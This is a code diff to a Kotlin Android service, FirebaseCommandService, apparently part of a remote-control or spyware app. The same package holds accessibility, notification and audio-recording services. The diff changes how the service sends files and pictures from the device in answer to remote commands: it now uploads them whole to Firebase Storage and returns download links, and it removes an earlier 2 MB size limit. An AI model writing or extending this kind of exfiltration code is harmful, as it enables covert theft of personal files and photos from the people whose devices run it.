@@ -35,6 +35,7 @@ import com.google.firebase.database.DatabaseError
 import com.google.firebase.database.DatabaseReference
 import com.google.firebase.database.FirebaseDatabase
 import com.google.firebase.database.ValueEventListener
+import com.google.firebase.storage.FirebaseStorage
 import com.jonas.x24.AudioRecordManager
 import com.jonas.x24.services.x24AccessibilityService
 import com.jonas.x24.services.x24NotificationService
@@ -188,35 +189,21 @@ class FirebaseCommandService : Service() {
                 return
             }
 
-            // aggressive compression to fit in firebase
-            val options = android.graphics.BitmapFactory.Options()
-            options.inJustDecodeBounds = true
-            android.graphics.BitmapFactory.decodeFile(path, options)
+            val storageRef = FirebaseStorage.getInstance().reference
+            val currentSession = sessionKey ?: return
+            val storagePath = "sessions/$currentSession/files/${System.currentTimeMillis()}_${file.name}"
+            val fileRef = storageRef.child(storagePath)
 
-            val maxDim = 800
-            var scale = 1
-            val halfHeight: Int = options.outHeight / 2
-            val halfWidth: Int = options.outWidth / 2
-
-            while (halfHeight / scale >= maxDim || halfWidth / scale >= maxDim) {
-                scale *= 2
+            fileRef.putFile(android.net.Uri.fromFile(file)).addOnSuccessListener {
+                fileRef.downloadUrl.addOnSuccessListener { uri ->
+                    // We send the URL and the storage path, separated by a pipe
+                    postResult("IMAGE", "${uri.toString()}|$storagePath")
+                }.addOnFailureListener {
+                    postResult("ERROR", "Failed to get download URL for picture.")
+                }
+            }.addOnFailureListener {
+                postResult("ERROR", "Failed to upload picture to storage: ${it.message}")
             }
-
-            options.inJustDecodeBounds = false
-            options.inSampleSize = scale
-
-            val bitmap = android.graphics.BitmapFactory.decodeFile(path, options)
-            if (bitmap == null) {
-                 postResult("ERROR", "Failed to decode image.")
-                 return
-            }
-
-            val outputStream = java.io.ByteArrayOutputStream()
-            bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 60, outputStream)
-            val byteArray = outputStream.toByteArray()
-            val base64 = android.util.Base64.encodeToString(byteArray, android.util.Base64.DEFAULT)
-
-            postResult("IMAGE", base64)
         } catch (e: Exception) {
             postResult("ERROR", "Failed to fetch picture: ${e.message}")
         }
@@ -229,14 +216,21 @@ class FirebaseCommandService : Service() {
                 postResult("ERROR", "File does not exist: $path")
                 return
             }
-            if (file.length() > 2 * 1024 * 1024) { // Additional safety check (2MB)
-                postResult("ERROR", "File is too large to fetch over Firebase: ${file.name} (${file.length()} bytes)")
-                return
-            }
 
-            val fileBytes = file.readBytes()
-            val base64 = android.util.Base64.encodeToString(fileBytes, android.util.Base64.DEFAULT)
-            postResult("FILE", "${file.name}|$base64")
+            val storageRef = FirebaseStorage.getInstance().reference
+            val currentSession = sessionKey ?: return
+            val storagePath = "sessions/$currentSession/files/${System.currentTimeMillis()}_${file.name}"
+            val fileRef = storageRef.child(storagePath)
+
+            fileRef.putFile(android.net.Uri.fromFile(file)).addOnSuccessListener {
+                fileRef.downloadUrl.addOnSuccessListener { uri ->
+                    postResult("FILE", "${file.name}|${uri.toString()}|$storagePath")
+                }.addOnFailureListener {
+                    postResult("ERROR", "Failed to get download URL for file.")
+                }
+            }.addOnFailureListener {
+                postResult("ERROR", "Failed to upload file to storage: ${it.message}")
+            }
         } catch (e: Exception) {
             postResult("ERROR", "Failed to fetch file: ${e.message}")
         }
